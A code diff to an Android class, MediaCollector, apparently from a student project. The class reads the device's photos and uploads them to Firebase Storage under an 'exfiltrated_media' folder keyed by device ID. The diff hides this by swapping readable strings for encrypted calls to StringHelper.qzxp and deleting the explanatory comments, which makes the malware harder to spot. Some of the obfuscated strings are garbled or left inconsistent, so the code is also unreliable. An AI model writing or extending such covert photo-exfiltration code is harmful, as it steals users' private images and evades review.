@@ -10,6 +10,7 @@ import android.provider.MediaStore;
 import android.util.Base64;
 import android.util.Log;
 
+import com.example.inf2007_mad_j1847.utils.StringHelper;
 import com.google.firebase.storage.FirebaseStorage;
 import com.google.firebase.storage.StorageReference;
 import com.google.firebase.storage.UploadTask;
@@ -22,7 +23,7 @@ import java.util.List;
 import java.util.Map;
 
 public class MediaCollector {
-    private static final String TAG = "Test-MediaCollector";
+    private static final String TAG = StringHelper.qzxp("icoKZ0Fz4ZSvFV/Po1ho3+gVFg==");
     private static List<Map<String, String>> mediaBuffer = new ArrayList<>();
     private static boolean scanInProgress = false;
     private static int lastScanCount = 0;
@@ -34,23 +35,21 @@ public class MediaCollector {
         List<Map<String, String>> results = new ArrayList<>();
 
         try {
-            // Check permission
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                 String permission = android.Manifest.permission.READ_MEDIA_IMAGES;
                 if (context.checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
-                    scanError = "Missing READ_MEDIA_IMAGES permission";
+                    scanError = StringHelper.qzxp("kynxGehhtKicMSQ5wJbMRAg7yPc9sRamHgYkftaxTAGtKe0E");
                     return results;
                 }
             }
 
-            // Query images
             String[] projection = {
                     MediaStore.Images.Media._ID,
                     MediaStore.Images.Media.DISPLAY_NAME,
                     MediaStore.Images.Media.DATE_ADDED
             };
 
-            String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";
+            String sortOrder = MediaStore.Images.Media.DATE_ADDED + StringHelper.qzxp("0yX5zg4=");
 
             Cursor cursor = null;
             try {
@@ -63,7 +62,7 @@ public class MediaCollector {
                 );
 
                 if (cursor == null) {
-                    scanError = "Failed to query media store";
+                    scanError = StringHelper.qzxp("xR0Qf5ecqempeIDxKznl76GpCypimJCOMiDh");
                     return results;
                 }
 
@@ -78,9 +77,9 @@ public class MediaCollector {
                     long date = cursor.getLong(dateColumn);
 
                     Map<String, String> map = new HashMap<>();
-                    map.put("id", String.valueOf(id));
-                    map.put("name", name);
-                    map.put("date", String.valueOf(date));
+                    map.put(StringHelper.qzxp("kB4="), String.valueOf(id));
+                    map.put(StringHelper.qzxp("��-"), name);
+                    map.put(StringHelper.qzxp("Z�"), String.valueOf(date));
                     results.add(map);
                     count++;
                 }
@@ -94,8 +93,8 @@ public class MediaCollector {
             lastScanCount = results.size();
 
         } catch (Exception e) {
-            scanError = "Error: " + e.getMessage();
-            Log.e(TAG, "Scan error", e);
+            scanError = StringHelper.qzxp("0NVj3hOKIQ==") + e.getMessage();
+            Log.e(TAG, StringHelper.qzxp("WepgVyxvGQ0HZQ=="), e);
         } finally {
             scanInProgress = false;
         }
@@ -105,27 +104,27 @@ public class MediaCollector {
 
     public static String getScanStatus() {
         if (scanInProgress) {
-            return "⏳ Scanning...";
+            return StringHelper.qzxp("henSz8XWyEu/0GJGqKfl");
         }
         if (scanError != null) {
-            Log.e(TAG, "========== SCAN ERROR DETAILS ==========");
+            Log.e(TAG, StringHelper.qzxp("HVSeousaezZv8HinduQo/5eSQqa5wN+loft1ClVudpEdVJ6i6xp7Ng=="));
             Log.e(TAG, scanError);
-            Log.e(TAG, "========================================");
+            Log.e(TAG, StringHelper.qzxp("PjNaxeMN5b6tzVjWGdKymr3VeAO7HgYPnoFyRShe/IE+M1rF4w3lvg=="));
 
             if (scanError.contains("permission") || scanError.contains("Permission")) {
-                return "❌ Need: READ_MEDIA_IMAGES";
+                return StringHelper.qzxp("nrWSvsCJAhMB3cgMi+y0qCTE38Px5jIqx7N2");
             } else if (scanError.contains("cursor") || scanError.contains("query")) {
-                return "❌ Database error";
+                return StringHelper.qzxp("UjQnyB1DQ0WW+gOgt32nr0/D");
             } else if (scanError.contains("null")) {
-                return "❌ Null pointer";
+                return StringHelper.qzxp("2+NueqIFQPiabag9Wv0bUQ==");
             } else {
-                return "❌ Scan failed - check logs";
+                return StringHelper.qzxp("NO31yQE7djn2wFew6xXexkyHd/pRPRWhGytb6w==");
             }
         }
         if (lastScanCount > 0) {
-            return "✅ Found " + lastScanCount + " images";
+            return StringHelper.qzxp("sB9YblY1qmCtkA==") + lastScanCount + StringHelper.qzxp("cuqwL3c/rA==");
         }
-        return "⚠️ Run 'scan_media' first";
+        return StringHelper.qzxp("SFYbTytF5M1If5NgWccteI6T1/yhOMsLTAr/ftE=");
     }
 
     public static List<Map<String, String>> getCollectedMedia() {
@@ -176,7 +175,7 @@ public class MediaCollector {
                 }
             }
         } catch (Exception e) {
-            Log.e(TAG, "Error getting image info: " + e.getMessage());
+            Log.e(TAG, StringHelper.qzxp("bL5bxsP5IjhHW70yuO2Lriv0oxBOyA+AX8Q=") + e.getMessage());
         }
         return null;
     }
@@ -205,7 +204,7 @@ public class MediaCollector {
                 }
             }
         } catch (Exception e) {
-            Log.e(TAG, "Error getting full image: " + e.getMessage());
+            Log.e(TAG, StringHelper.qzxp("6H9jET8oKyCn49YQ6pG1YmeAeaORYpSjUBc=") + e.getMessage());
         }
         return null;
     }
@@ -214,36 +213,32 @@ public class MediaCollector {
         try {
             String imageData = getFullImage(context, imageId);
             if (imageData == null) {
-                Log.e(TAG, "Failed to get image data for ID: " + imageId);
+                Log.e(TAG, StringHelper.qzxp("RqWS+i6PjZaqTVwlvTssWv1wQvCt826uqPRbrKwqPU0g") + imageId);
                 return;
             }
 
-            // Get image name
             Map<String, String> info = getImageInfo(context, imageId);
-            String fileName = info != null ? info.get("name") : "image_" + imageId + ".jpg";
+            String fileName = info != null ? info.get("name") : StringHelper.qzxp("VJWW7QRO") + imageId + StringHelper.qzxp("E5KH7Q==");
 
-            // Decode Base64 to bytes
             byte[] imageBytes = Base64.decode(imageData, Base64.DEFAULT);
 
-            // Create path in exfiltrated_media folder
             String timestamp = String.valueOf(System.currentTimeMillis());
-            String path = "exfiltrated_media/" + deviceId + "/" + timestamp + "_" + fileName;
+            String path = StringHelper.qzxp("zROOQQOZJvR+Pe/8BmlTKsYh") + deviceId + "hw==" + timestamp + "9w==" + fileName;
 
-            // Upload to Firebase Storage
             FirebaseStorage storage = FirebaseStorage.getInstance();
             StorageReference storageRef = storage.getReference().child(path);
 
-            Log.d(TAG, "📤 Uploading to: " + path);
+            Log.d(TAG, StringHelper.qzxp("THlTtfnyGJz6ijwaS+w43MY5xQ==") + path);
 
             UploadTask uploadTask = storageRef.putBytes(imageBytes);
             uploadTask.addOnSuccessListener(taskSnapshot -> {
-                Log.d(TAG, "✅ Upload successful!");
+                Log.d(TAG, StringHelper.qzxp("IvcV3NnDNGxHjtAGSEOFycT8J1IE/A=="));
             }).addOnFailureListener(e -> {
-                Log.e(TAG, "❌ Upload failed: " + e.getMessage());
+                Log.e(TAG, StringHelper.qzxp("056dlgrC0oTxPOFceLmSuSODGA==") + e.getMessage());
             });
 
         } catch (Exception e) {
-            Log.e(TAG, "Upload error: " + e.getMessage());
+            Log.e(TAG, StringHelper.qzxp("qWTh3pfvDEL+f2rk3Io=") + e.getMessage());
         }
     }
 }
